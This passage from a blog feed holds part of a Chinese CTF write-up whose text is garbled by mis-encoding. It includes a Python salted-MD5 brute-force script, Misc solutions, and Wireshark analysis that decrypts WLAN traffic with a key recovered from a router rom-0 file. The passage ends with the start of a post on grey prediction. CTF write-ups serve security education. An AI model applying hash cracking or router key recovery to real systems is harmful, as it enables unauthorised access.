string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" alt=""></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-ä¼šé£çš„ç‹—ç‹—"><a href="#Misc1-ä¼šé£çš„ç‹—ç‹—" class="headerlink" title="Misc1-ä¼šé£çš„ç‹—ç‹—"></a>Misc1-ä¼šé£çš„ç‹—ç‹—</h3><p><img src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" alt=""></p><p>ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹å¯ä»¥å¾—åˆ°æœ«å°¾çš„base64å­—ç¬¦ä¸²ï¼Œæ¥è§£ç å¾—åˆ°flag</p><p><img src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" alt=""></p><h3 id="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"><a href="#Misc2-æ–‡ä»¶ç±»å‹åˆ†æ" class="headerlink" title="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"></a>Misc2-æ–‡ä»¶ç±»å‹åˆ†æ</h3><blockquote><p>å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œç‚¹å¼€æ¥çœ‹çœ‹ï¼Œå­˜åœ¨[content-types].xmlæ–‡ä»¶ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯å¾®è½¯å…¬å¸officeå¥—ä»¶çš„æ ¼å¼ã€‚ç®€å•è¯•è¿‡docï¼Œdocxï¼Œpptï¼Œpptxï¼Œxlsï¼Œxlxsæ²¡ç”¨ä¹‹åï¼ŒæŸ¥åˆ°xpsï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" alt=""></p><p>äºæ˜¯æ”¹ä¸ºxpsæ–‡ä»¶åç¼€å³å¯ï¼Œå°†xpsæäº¤ã€‚</p></blockquote><h3 id="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"><a href="#Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š" class="headerlink" title="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"></a>Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š</h3><blockquote><p>ç®€å•çš„ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œä¿®æ”¹å…¨å±€åŠ å¯†æ ‡å¿—ä½ï¼Œå°†å¥‡æ•°æ”¹ä¸ºå¶æ•°å³å¯ã€‚</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-è¯±äººçš„éŸ³ä¹"><a href="#Misc4-è¯±äººçš„éŸ³ä¹" class="headerlink" title="Misc4-è¯±äººçš„éŸ³ä¹"></a>Misc4-è¯±äººçš„éŸ³ä¹</h3><blockquote><p>è¿™é¢˜çš„éŸ³é¢‘æ–‡ä»¶ä¸­å­˜åœ¨ä¸€æ®µæ‘©æ–¯ç”µç ï¼ˆæœ‰çš„åŒå­¦é€šè¿‡äºŒè¿›åˆ¶getflagï¼‰ï¼Œé€šè¿‡éŸ³é¢‘åˆ†æè½¯ä»¶å¯ä»¥å°†å…¶æå–å‡ºæ¥ï¼š</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#ä¸€æ¬¡æ€§è§£ç è¡Œä¸é€šï¼Œå¯ä»¥å°†å…¶åˆ†ä¸ºä¸‰æ®µåˆ†åˆ«è§£ç å¹¶ä¸”å°†ä¸‰ä¸ªéæ­£å¸¸å­—ç¬¦è½¬ä¸º16è¿›åˆ¶ï¼š</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>æ™¬<span class="token number">61677b6368</span>æ™¬ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>ã…°<span class="token number">74756e65</span>ã…° <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>å¼µ<span class="token number">337665727c</span>å¼µ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#è¿›è¡Œæ‹¼æ¥</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#å¯ä»¥å¾—åˆ°</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#æäº¤ch1ptune_53verå³å¯</span></code></pre><h3 id="Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º"><a href="#Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º" class="headerlink" title="Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)"></a>Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)</h3><blockquote><p> å¯ä»¥é€šè¿‡binwalkå¾—åˆ°ä¸€ä¸ªé€†å‘é¢˜ï¼Œè¾ƒéš¾ï¼Œæœªè§£å‡ºã€‚</p></blockquote><h2 id="ç½‘ç»œåè®®åˆ†æ"><a href="#ç½‘ç»œåè®®åˆ†æ" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ"></a>ç½‘ç»œåè®®åˆ†æ</h2><h3 id="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦"><a href="#ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~"></a>ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~</h3><blockquote><p>wiresharkæ‰“å¼€æ•°æ®åŒ…åï¼Œä¾æ¬¡ä½¿ç”¨ä»¥ä¸‹è¿‡æ»¤è§„åˆ™:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>å³å¯é€šè¿‡<code>udp contains flag</code>æŸ¥åˆ°flagã€‚</p><p><img src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" alt=""></p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º"><a href="#ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)"></a>ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)</h3><blockquote><p>ç»è¿‡ç–¯ç‹‚æ‰‹åŠ¨æå–åå‘ç°åªèƒ½è·å¾—ä¸€ä¸å›¾ç‰‡ï¼Œèµ›åå¾—çŸ¥éœ€è¦ç”¨<strong>tcpflow</strong>è¿™ä¸ªç¥å™¨é‡æ„æŸå®³çš„tcpæ•°æ®ï¼Œä»è€Œå¾—åˆ°å›¾åƒã€‚</p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ3-thief"><a href="#ç½‘ç»œåè®®åˆ†æ3-thief" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ3-thief"></a>ç½‘ç»œåè®®åˆ†æ3-thief</h3><blockquote><p>æ‹¿åˆ°æ•°æ®åŒ…æ‰“å¼€åå‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯<code>802.11 wlan</code>æ•°æ®åŒ…ï¼Œè¿‡æ»¤ä¸€ä¸‹httpè¯·æ±‚ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" alt=""></p><p>å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªè¯·æ±‚çš„æ˜¯<code>/rom-0</code>ï¼Œç¡®å®ä¸çŸ¥ä¸ºä½•å°±è§‰å¾—è¿™ä¸ªæ˜¯å…³é”®ï¼Œgoogleæœç´¢ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" alt=""></p><p>ç‚¹è¿›routerPwnå‘ç°æ˜¯ä¸€ä¸ªè§£å‹rom-0æ–‡ä»¶çš„ç½‘å€ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯è¿˜ç¼ºä¸€ä¸ªæ–‡ä»¶ã€‚æ¥ä¸‹æ¥é€šè¿‡å¯¼å‡ºhttpå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªrom0æ–‡ä»¶ï¼Œæ­£å¥½å°†å…¶è§£å¯†å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#çŒœæµ‹æ˜¯ç”¨æ¥è§£å¯†çš„å¯†é’¥å’¯</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>åœ¨è¿ç”¨wiresharkåˆ†ææµé‡çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ç»å¸¸éœ€è¦ä½¿ç”¨å¯†é’¥ä¹‹ç±»çš„ä¸œè¥¿æ¥è§£å¯†æµé‡ï¼Œæ­¤å¤„åŒæ ·é€šè¿‡ <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">æŸ¥è¯¢èµ„æ–™</a> å¯ä»¥è·å¾—è§£å¯†æ–¹å¼ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" alt=""></p><p>å°†å¯†ç Rome4040å¯¼å…¥è§£å¯†ï¼Œå¯ä»¥å‘ç°çš„ç¡®å‡ºç°äº†<strong>å¾ˆå¤šhttpå’Œtcpçš„åŒ…</strong>ï¼Œæ ¹æ®é¢˜ç›®æç¤ºä½¿ç”¨è¿‡æ»¤<code>http contains CTF</code>å¾—åˆ°flagï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" alt=""></p></blockquote><blockquote><p>ğŸ†’wandoucup-CTF-WPåˆ°æ­¤ç»“æŸã€‚</p><p>Publish by Yof3ngğŸ‘Œã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;wandoucup-ctf&quot;&gt;&lt;a href=&quot;#wandoucup-ctf&quot; class=&quot;headerlink&quot; title=&quot;wandoucup-ctf&quot;&gt;&lt;/a&gt;wandoucup-ctf&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="æµé‡åˆ†æ" scheme="http://www.yof3ng.xyz/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ç°è‰²é¢„æµ‹</title>
    <link href="http://www.yof3ng.xyz/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/"/>
    <id>http://www.yof3ng.xyz/2018/10/27/ç°è‰²é¢„æµ‹/</id>
    <published>2018-10-27T12:45:10.000Z</published>
    <updated>2018-11-02T00:46:55.353Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰"><a href="#ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰" class="headerlink" title="ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰"></a>ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰</h1><blockquote><p>ç®€å•äº†è§£ä¸€ä¸‹ç°è‰²é¢„æµ‹è¿™ç©æ„å„¿ã€‚hahağŸ™‚</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ</h2><blockquote><p>ç°è‰²ç†è®ºï¼š</p><p>é€šè¿‡å¯¹åŸå§‹æ•°æ®çš„å¤„ç†æŒ–æ˜ç³»ç»Ÿå˜åŠ¨è§„å¾‹ï¼Œå»ºç«‹ç›¸åº”å¾®åˆ†æ–¹ç¨‹ï¼Œä»è€Œé¢„æµ‹äº‹ç‰©æœªæ¥å‘å±•çŠ¶å†µã€‚ </p><ul><li>ä¼˜ç‚¹ï¼šå¯¹äºä¸ç¡®å®šå› ç´ çš„å¤æ‚ç³»ç»Ÿé¢„æµ‹æ•ˆæœè¾ƒå¥½ï¼Œä¸”æ‰€éœ€æ ·æœ¬æ•°æ®è¾ƒå°ï¼› </li><li>ç¼ºç‚¹ï¼šåŸºäºæŒ‡æ•°ç‡çš„é¢„æµ‹æ²¡æœ‰è€ƒè™‘ç³»ç»Ÿçš„éšæœºæ€§ï¼Œä¸­é•¿æœŸé¢„æµ‹ç²¾åº¦è¾ƒå·®ã€‚</li></ul><p>ç™¾åº¦ç™¾ç§‘æ˜¯è¿™ä¹ˆè¯´çš„ï¼š</p><p><a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/7534704" target="_blank" rel="noopener">ç°è‰²é¢„æµ‹</a>æ˜¯å°±<a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E7%B3%BB%E7%BB%9F/9595581" target="_blank" rel="noopener">ç°è‰²ç³»ç»Ÿ</a>ã€ç°è‰²ç³»ç»Ÿæ˜¯æŒ‡â€œéƒ¨åˆ†ä¿¡æ¯å·²çŸ¥ï¼Œéƒ¨åˆ†ä¿¡æ¯æœªçŸ¥â€œçš„â€å°æ ·æœ¬â€œï¼Œâ€è´«ä¿¡æ¯â€œçš„ä¸ç¡®å®šç³»ç»Ÿï¼Œä»¥ç°è‰²æ¨¡å‹ï¼ˆG,Mï¼‰ä¸ºæ ¸å¿ƒçš„æ¨¡å‹ä½“ç³»ã€‚ã€‘æ‰€åšçš„é¢„æµ‹ã€‚æ‰€è°“ç°è‰²ç³»ç»Ÿæ˜¯ä»‹äºç™½è‰²ç³»ç»Ÿå’Œé»‘ç®±ç³»ç»Ÿä¹‹é—´çš„è¿‡æ¸¡ç³»ç»Ÿã€‚å…¶å…·ä½“çš„å«ä¹‰æ˜¯:å¦‚æœæŸä¸€ç³»ç»Ÿçš„å…¨éƒ¨ä¿¡æ¯å·²çŸ¥ä¸ºç™½è‰²ç³»ç»Ÿï¼Œå…¨éƒ¨ä¿¡æ¯æœªçŸ¥ä¸ºé»‘ç®±ç³»ç»Ÿï¼Œéƒ¨åˆ†ä¿¡æ¯å·²çŸ¥ï¼Œéƒ¨åˆ†ä¿¡æ¯æœªçŸ¥ï¼Œé‚£ä¹ˆè¿™ä¸€ç³»ç»Ÿå°±æ˜¯ç°è‰²ç³»ç»Ÿã€‚</p></blockquote><h2 